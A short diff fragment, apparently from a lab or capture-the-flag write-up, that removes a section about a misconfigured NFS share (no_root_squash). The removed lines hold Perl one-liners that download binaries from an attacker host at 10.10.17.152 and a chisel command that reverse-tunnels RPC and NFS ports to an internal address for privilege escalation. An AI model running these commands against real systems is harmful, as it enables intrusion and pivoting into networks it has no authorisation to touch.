@@ -320,19 +320,3 @@ bash2-5.1$
 
 
 
-
-
-- NFS bị misconfigured (no root_squash disabled) 
-
-
-```code
-perl -MIO::Socket::INET -e '$s=IO::Socket::INET->new("10.10.17.152:8181");print $s "GET /nfs-ls HTTP/1.0\r\n\r\n";while(<$s>){last if/^\r?\n$/}open F,">nfsclient";binmode F;print F while<$s>;close F'
-```
-
-```code
-./chisel client 10.10.17.152:8080 R:111:172.18.0.1:111 R:2049:172.18.0.1:2049 &
-```
-
-```code
-perl -MIO::Socket::INET -e '$s=IO::Socket::INET->new("10.10.17.152:8000");print $s "GET /agent HTTP/1.0\r\n\r\n";while(<$s>){last if/^\r?\n$/}open F,">nfsclient";binmode F;print F while<$s>;close F'
-```
